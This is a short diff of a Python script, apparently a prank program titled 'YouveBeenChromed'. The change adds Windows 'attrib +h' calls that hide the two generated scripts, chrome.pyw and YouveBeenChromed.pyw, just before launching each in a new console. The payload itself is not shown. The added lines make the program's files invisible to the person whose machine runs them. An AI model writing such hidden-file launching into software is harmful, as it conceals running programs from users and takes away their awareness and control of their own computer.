@@ -38,6 +38,8 @@ def getChromed():
 getChromed()
 ''')
 
+    subprocess.call('attrib +h ' + 'chrome.pyw')
+    subprocess.call('attrib +h ' + 'YouveBeenChromed.pyw')
     subprocess.call('chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
     subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
 
